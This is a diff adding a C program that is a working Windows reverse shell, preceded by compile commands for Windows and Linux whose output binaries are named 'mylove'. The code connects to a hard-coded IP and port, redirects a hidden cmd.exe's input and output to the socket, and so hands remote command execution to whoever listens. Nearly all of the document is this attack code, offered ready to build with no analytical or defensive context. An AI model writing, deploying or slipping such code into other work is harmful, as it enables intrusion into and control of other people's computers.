@@ -1,0 +1,71 @@
+//compile windows and linux 
+
+gcc -std=c99 linux.c -o mylove.elf
+i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o mylove.exe -lws2_32
+
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+
+#define CLIENT_IP "192.168.1.33" // Change this to your IP address
+#define CLIENT_PORT 9002 // Change this to your port
+
+int main(void) {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        printf("WSAStartup failed.\n");
+        return 1;
+    }
+
+    // Create a socket
+    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (sock == INVALID_SOCKET) {
+        printf("Socket creation failed.\n");
+        WSACleanup();
+        return 1;
+    }
+
+    // Setup the sockaddr_in structure
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(CLIENT_PORT);
+    server.sin_addr.s_addr = inet_addr(CLIENT_IP);
+
+    // Connect to the server
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
+        printf("Connection failed.\n");
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+
+    // Redirect input, output, and error to the socket
+    STARTUPINFO sinfo;
+    PROCESS_INFORMATION pinfo;
+    memset(&sinfo, 0, sizeof(sinfo));
+    sinfo.cb = sizeof(sinfo);
+    sinfo.dwFlags = STARTF_USESTDHANDLES;
+    sinfo.hStdInput = (HANDLE)sock;
+    sinfo.hStdOutput = (HANDLE)sock;
+    sinfo.hStdError = (HANDLE)sock;
+
+    // Start a new cmd.exe process
+    if (CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo) == 0) {
+        printf("CreateProcess failed.\n");
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+
+    // Wait for the process to finish
+    WaitForSingleObject(pinfo.hProcess, INFINITE);
+
+    // Cleanup
+    CloseHandle(pinfo.hProcess);
+    CloseHandle(pinfo.hThread);
+    closesocket(sock);
+    WSACleanup();
+
+    return 0;
+}
